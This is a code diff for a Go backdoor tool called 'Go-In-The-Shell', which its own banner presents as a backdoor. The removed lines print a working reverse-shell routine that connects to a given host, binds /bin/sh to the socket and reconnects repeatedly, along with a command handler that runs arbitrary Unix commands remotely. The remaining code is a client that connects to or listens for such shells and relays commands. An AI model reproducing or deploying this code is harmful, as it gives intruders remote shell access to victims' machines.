@@ -2,23 +2,21 @@ package main
 
 import (
 	"os"
-	"os/exec"
 	"fmt"
 	"net"
 	"time"
 	"bufio"
-	"strings"
+	//"strings"
 	"crypto/rsa"
 	"crypto/rand"
 	"crypto/sha256"
-	"encoding/gob"
+	//"encoding/gob"
 )
 
 func Banner() {
 	fmt.Println("\n,---.        |        --.--|            ,---.|         |    |    \n|  _.,---.   |,---.     |  |---.,---.   `---.|---.,---.|    |    \n|   ||   |---||   |---  |  |   ||---'---    ||   ||---'|    |    \n`---'`---'   ``   '     `  `   '`---'   `---'`   '`---'`---'`---'")
 	fmt.Println("\nGo-In-The-Shell is a flexible and userfriendly backdoor")
-	fmt.Println("Made By Denis <cr1ng3> REMACLE\n")
-	fmt.Println("For \"legally ok\" use only\n")
+
 }
 
 func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
@@ -77,70 +75,25 @@ func Decryption(message string, local_priv_key rsa.PrivateKey) string {
 	}
 	return string(plaintext)
 }
-
-func reverse(host string) {
-	//A cool reverseshell in go
-
-	//Sending connection
-	connection, err := net.Dial("tcp", host)
-	if nil != err {
-		if nil != connection {
-			connection.Close()
-		}
-		time.Sleep(5 * time.Second)
-		reverse(host)
-	}
-	//Use /bin/sh
-	cmd := exec.Command("/bin/sh")
-
-	//Get user command
-	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
-
-	//Launch user command and send user command output
-	cmd.Run()
-	
-	//Close connection
-	connection.Close()
-
-	//Recursion
-	reverse(host)
-}
-
-func InterpretCommand(command string) string {
-	//Command interpretation very basic stuff here
-	command = strings.Trim(command, "\n")
-	fields := split(command, ' ')
-	if fields[0] == "help" {
-		return "Commands you can use are : help, set_backdoor <PORT>, command <UNIX_COMMAND>, get_reverseshell <IP:PORT>\n"
-	} else if fields[0] == "command" {
-		payload := strings.TrimLeft(command, "command ")
-		fmt.Println(payload)
-		output_byte, _ := exec.Command(payload).Output()
-		output := fmt.Sprintf("%s", output_byte)
-		if fields[1] == "cd" {
-			os.Chdir(fields[2])
-		}
-		return output
-	} else if fields[0] == "get_reverseshell" {
-		go reverse(fields[1])
-		return "good"
-	} else {
-		return "Unknown command try help"
-	}
-}
-
+/*
 func EncryptedConnectionHandler(connection net.Conn, local_pub_key rsa.PublicKey, local_priv_key rsa.PrivateKey, connect bool){
 	//A goroutine to receive data from distants
-	fmt.Printf("Handling %s\n", connection.RemoteAddr().String())
-	fmt.Fprintf(connection, "\nConnected to a Go-In-The-Shell backdoor\n\nGO-IN-THE-SHELL >> ")
 
 	//We use gob encoding in order to transmit and receive data safely
 	enc := gob.NewEncoder(connection)
 	dec := gob.NewDecoder(connection)
-	//Big dumb key exchange
-	var distant_pub_key = rsa.PublicKey{}
-	dec.Decode(&distant_pub_key)
-	enc.Encode(&local_pub_key)
+
+	if connect == true {
+		var distant_pub_key = rsa.PublicKey{}
+		//Big dumb key exchange
+		enc.Encode(&local_pub_key)
+		dec.Decode(&distant_pub_key)
+	} else {
+		//Big dumb key exchange
+		var distant_pub_key = rsa.PublicKey{}
+		dec.Decode(&distant_pub_key)
+		enc.Encode(&local_pub_key)
+	}
 
 	for {
 		var command string
@@ -149,47 +102,47 @@ func EncryptedConnectionHandler(connection net.Conn, local_pub_key rsa.PublicKey
 		enc.Encode(Encryption(output, distant_pub_key))
 	}
 	connection.Close()
-}
+}*/
 
 func NormalConnectionHandler(connection net.Conn) {
+	server, _ := bufio.NewReader(connection).ReadString('\000')
+	fmt.Printf(server)
 	//A goroutine to receive data from distants
-	fmt.Printf("Handling %s\n", connection.RemoteAddr().String())
-	fmt.Fprintf(connection, "\nConnected to a Go-In-The-Shell backdoor\nyou may use it with any tool you'd like but it'll be better on our client\n\nMade By Denis <cr1ng3> REMACLE\nFor \"legally ok\" use only\n\nGO-IN-THE-SHELL >> \000")
-	
 	for {
-		command, err := bufio.NewReader(connection).ReadString('\n')
-		if err == nil {
-			fmt.Println(command)
-			output := InterpretCommand(command)
-			fmt.Fprintf(connection, output+"GO-IN-THE-SHELL >> \000")
-		} else {
-			break
-		}
-		
+		scanner := bufio.NewScanner(os.Stdin)
+		scanner.Scan()
+		fmt.Fprintf(connection, scanner.Text()+"\n")
+		server, _ := bufio.NewReader(connection).ReadString('\000')
+		fmt.Printf(server)
 	}
 	connection.Close()
 }
 
 func Connect(ip_port string, encrypted bool) {
-	//Connection for reverse shell
+	//Connection for bind shell
 	var connection net.Conn
 	var err error
 	for {
 		connection, err = net.Dial("tcp", ip_port)
 		if err == nil {
-			if encrypted == true {
-				local_pub_key, local_priv_key := KeyGen()
-				EncryptedConnectionHandler(connection, local_pub_key, local_priv_key, true)
-			} else {
-				NormalConnectionHandler(connection)
-			}
+			break
 		}
 		time.Sleep(5 * time.Second)
 	}
+	
+	NormalConnectionHandler(connection)
+	/*
+	if encrypted == true {
+		local_pub_key, local_priv_key := KeyGen()
+		EncryptedConnectionHandler(connection, local_pub_key, local_priv_key, true)
+	} else {
+		NormalConnectionHandler(connection)
+	}
+	*/
 }
 
 func Listen(ip_port string, encrypted bool) {
-	//Listen for bind shell
+	//Listen for reverse shell
 	listener, err := net.Listen("tcp", ip_port)
 	if err != nil {
 		fmt.Printf("Could not start listener: %s\n", err)
@@ -202,22 +155,24 @@ func Listen(ip_port string, encrypted bool) {
 		if err != nil {
 			fmt.Println("Could not Accept connection")
 		}
-	
+		NormalConnectionHandler(connection)
+	/*
 		if encrypted == true {
 			local_pub_key, local_priv_key := KeyGen()
 			EncryptedConnectionHandler(connection, local_pub_key, local_priv_key, false)
 		} else {
 			NormalConnectionHandler(connection)
 		}
+		*/
 	}
 }
 
 func main(){
 	Banner()
-
 	arguments := os.Args
 
 	if len(arguments) == 1 {
+			Banner()
 			fmt.Println("Please provide arguments")
 			fmt.Println("gits -r <IP:PORT> : reach to given host")
 			fmt.Println("gits -l <IP:PORT> : listen on given port")
